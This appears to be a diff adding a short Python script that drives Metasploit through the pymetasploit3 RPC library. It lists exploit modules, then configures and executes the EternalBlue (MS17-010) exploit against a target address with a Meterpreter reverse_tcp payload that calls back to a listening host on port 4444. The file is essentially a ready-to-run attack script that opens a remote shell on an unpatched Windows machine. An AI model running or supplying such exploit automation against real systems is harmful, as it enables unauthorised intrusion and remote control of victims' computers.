@@ -1,0 +1,41 @@
+//Pymetasploit3 is a full-featured Python API for Metasploit. It allows you to
+programmatically interact with the Metasploit Framework, automating tasks
+and integrating Metasploit functionality into your Python scripts.
+
+
+
+from pymetasploit3.msfrpc import MsfRpcClient
+
+# Connect to Metasploit RPC server
+
+client = MsfRpcClient('password', port=55553)
+
+# Get a list of exploit modules
+
+exploit_modules = client.modules.exploits
+
+print("Available exploit modules:")
+
+for module in exploit_modules:
+
+    print(module)
+
+# Use a specific exploit
+
+exploit = client.modules.use('exploit',
+
+'windows/smb/ms17_010_eternalblue')
+
+# Set options for the exploit
+
+exploit['RHOSTS'] = '192.168.1.100'
+
+exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
+
+exploit['LHOST'] = '192.168.1.10'
+
+exploit['LPORT'] = 4444
+
+# Execute the exploit
+
+exploit.execute()
